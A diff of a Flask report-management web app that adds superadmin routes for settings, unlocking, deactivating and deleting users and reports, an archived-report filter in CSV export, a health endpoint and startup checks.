+@app.route("/admin/settings", methods=["GET", "POST"])
+@superadmin_required
+def admin_settings():
+    db = get_db()
+    if request.method == "POST":
+        csrf_protect()
+        registration = "1" if request.form.get("registration_open") == "on" else "0"
+        db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('registration_open', ?)", (registration,))
+        db.commit()
+        flash("Settings saved.", "success")
+        return redirect(url_for("admin_settings"))
+    reg_open = db.execute("SELECT value FROM settings WHERE key = 'registration_open'").fetchone()
+    return render_template("admin_settings.html", registration_open=(reg_open and reg_open["value"] == "1"))
+
+
+@app.route("/admin/unlock/<int:user_id>", methods=["GET", "POST"])
+@superadmin_required
+def admin_unlock(user_id):
+    db = get_db()
+    target = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
+    if not target:
+        abort(404)
+    if request.method == "POST":
+        csrf_protect()
+        reason = clean_text(request.form.get("reason", ""), 500)
+        if not reason:
+            flash("You must provide a reason for unlocking this account.", "danger")
+            return render_template("admin_unlock.html", target=target)
+        db.execute(
+            "UPDATE users SET is_active = 1, locked_at = NULL, lock_reason = ? WHERE id = ?",
+            (reason, user_id),
+        )
+        db.commit()
+        flash(f"{target['full_name']} has been unlocked. Reason recorded: {reason}", "success")
+        return redirect(url_for("admin_users"))
+    return render_template("admin_unlock.html", target=target)
+
+
+@app.route("/admin/users/<int:user_id>/manage", methods=["GET", "POST"])
+@superadmin_required
+def admin_manage_user(user_id):
+    db = get_db()
+    target = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
+    if not target:
+        abort(404)
+    if target["role"] in ("superadmin", "shadowadmin") and target["id"] != g.user["id"]:
+        abort(403)
+    if request.method == "POST":
+        csrf_protect()
+        action = request.form.get("action", "")
+        data_choice = request.form.get("data_choice", "keep")
+        if action == "deactivate":
+            db.execute(
+                "UPDATE users SET is_active = 0, data_retention = ? WHERE id = ?",
+                (data_choice, user_id),
+            )
+            db.commit()
+            flash(f"{target['full_name']} deactivated. Data: {data_choice}.", "success")
+            return redirect(url_for("admin_users"))
+        elif action == "delete":
+            if data_choice == "delete_all":
+                reports = db.execute("SELECT id, pdf_filename FROM reports WHERE user_id = ?", (user_id,)).fetchall()
+                for r in reports:
+                    db.execute("DELETE FROM report_edits WHERE report_id = ?", (r["id"],))
+                    db.execute("DELETE FROM report_comments WHERE report_id = ?", (r["id"],))
+                    if r["pdf_filename"]:
+                        pdf_path = REPORT_DIR / r["pdf_filename"]
+                        if pdf_path.exists():
+                            pdf_path.unlink()
+                db.execute("DELETE FROM reports WHERE user_id = ?", (user_id,))
+            elif data_choice == "archive":
+                db.execute("UPDATE reports SET archived = 1 WHERE user_id = ?", (user_id,))
+            db.execute("DELETE FROM report_access WHERE admin_id = ? OR employee_id = ?", (user_id, user_id))
+            db.execute("DELETE FROM report_edits WHERE user_id = ?", (user_id,))
+            db.execute("DELETE FROM report_comments WHERE admin_id = ?", (user_id,))
+            db.execute("DELETE FROM password_resets WHERE user_id = ?", (user_id,))
+            db.execute("DELETE FROM users WHERE id = ?", (user_id,))
+            db.commit()
+            flash(f"{target['full_name']} deleted. Data: {data_choice}.", "success")
+            return redirect(url_for("admin_users"))
+        else:
+            flash("Invalid action.", "danger")
+            return redirect(url_for("admin_manage_user", user_id=user_id))
+    report_count = db.execute("SELECT COUNT(*) AS c FROM reports WHERE user_id = ?", (user_id,)).fetchone()["c"]
+    return render_template("admin_manage_user.html", target=target, report_count=report_count)
 
 
 @app.route("/admin/department", methods=["GET", "POST"])
@@ -1409,25 +1971,26 @@ def update_status(report_id):
 @login_required
 def export_csv():
     db = get_db()
+    archived_expr = archived_filter("reports.archived")
     if g.user["role"] == "employee":
         rows = db.execute(
-            "SELECT reports.*, users.full_name FROM reports JOIN users ON users.id = reports.user_id WHERE reports.user_id = ? AND reports.archived = 0 ORDER BY reports.report_date DESC",
+            f"SELECT reports.*, users.full_name FROM reports JOIN users ON users.id = reports.user_id WHERE reports.user_id = ? AND {archived_expr} = 0 ORDER BY reports.report_date DESC",
             (g.user["id"],),
         ).fetchall()
     elif g.user["role"] == "admin":
         rows = db.execute(
-            """
+            f"""
             SELECT reports.*, users.full_name FROM reports
             JOIN users ON users.id = reports.user_id
             JOIN report_access ON report_access.employee_id = reports.user_id
-            WHERE report_access.admin_id = ? AND reports.archived = 0
+            WHERE report_access.admin_id = ? AND {archived_expr} = 0
             ORDER BY reports.report_date DESC
             """,
             (g.user["id"],),
         ).fetchall()
     else:
         rows = db.execute(
-            "SELECT reports.*, users.full_name FROM reports JOIN users ON users.id = reports.user_id WHERE reports.archived = 0 ORDER BY reports.report_date DESC"
+            f"SELECT reports.*, users.full_name FROM reports JOIN users ON users.id = reports.user_id WHERE {archived_expr} = 0 ORDER BY reports.report_date DESC"
         ).fetchall()
 
     output = io.StringIO()
@@ -1459,10 +2022,31 @@ def archive_report(report_id):
     return redirect(url_for("view_report", report_id=report_id))
 
 
+@app.route("/reports/<int:report_id>/delete", methods=["POST"])
+@superadmin_required
+def delete_report(report_id):
+    csrf_protect()
+    db = get_db()
+    report = db.execute("SELECT * FROM reports WHERE id = ?", (report_id,)).fetchone()
+    if not report:
+        abort(404)
+    pdf = report["pdf_filename"]
+    db.execute("DELETE FROM report_edits WHERE report_id = ?", (report_id,))
+    db.execute("DELETE FROM report_comments WHERE report_id = ?", (report_id,))
+    db.execute("DELETE FROM reports WHERE id = ?", (report_id,))
+    db.commit()
+    if pdf:
+        pdf_path = REPORT_DIR / pdf
+        if pdf_path.exists():
+            pdf_path.unlink()
+    flash("Report permanently deleted.", "success")
+    return redirect(url_for("dashboard"))
+
+
 @app.route("/reports/<int:report_id>/comment", methods=["POST"])
 @login_required
 def add_comment(report_id):
-    if g.user["role"] not in ("admin", "superadmin"):
+    if g.user["role"] not in ("admin", "superadmin", "shadowadmin"):
         abort(403)
     csrf_protect()
     report = get_db().execute("SELECT * FROM reports WHERE id = ?", (report_id,)).fetchone()
@@ -1483,6 +2067,27 @@ def add_comment(report_id):
     return redirect(url_for("view_report", report_id=report_id))
 
 
+def cleanup_expired_resets():
+    try:
+        db = get_db()
+        db.execute("DELETE FROM password_resets WHERE expires_at < ?", (now(),))
+        db.commit()
+    except Exception:
+        pass
+
+
+@app.route("/health")
+def health_check():
+    db_ok = False
+    try:
+        get_db().execute("SELECT 1")
+        db_ok = True
+    except Exception:
+        pass
+    status = 200 if db_ok else 503
+    return {"status": "healthy" if db_ok else "unhealthy", "database": "connected" if db_ok else "disconnected"}, status
+
+
 @app.errorhandler(403)
 def forbidden(_error):
     return render_template("error.html", title="Access restricted", message="You do not have permission to view this page or report."), 403
@@ -1500,15 +2105,18 @@ def not_found(_error):
 
 @app.errorhandler(500)
 def server_error(_error):
+    log.exception("Unhandled server error")
     return render_template("error.html", title="Server error", message="Something went wrong. Please try again or contact the administrator."), 500
 
 
+init_db()
+cleanup_expired_resets()
+validate_production_config()
+if app.config["SECRET_KEY"] == "local-dev-change-me":
+    import warnings
+    warnings.warn("Using insecure default SECRET_KEY. Set the SECRET_KEY environment variable for production.")
+
 if __name__ == "__main__":
-    init_db()
-    validate_production_config()
-    if app.config["SECRET_KEY"] == "local-dev-change-me":
-        import warnings
-        warnings.warn("Using insecure default SECRET_KEY. Set the SECRET_KEY environment variable for production.")
     port = int(os.environ.get("PORT", "5055"))
     debug = os.environ.get("DEBUG", "").lower() in ("1", "true", "yes")
     app.run(host=os.environ.get("HOST", "0.0.0.0"), port=port, debug=debug)
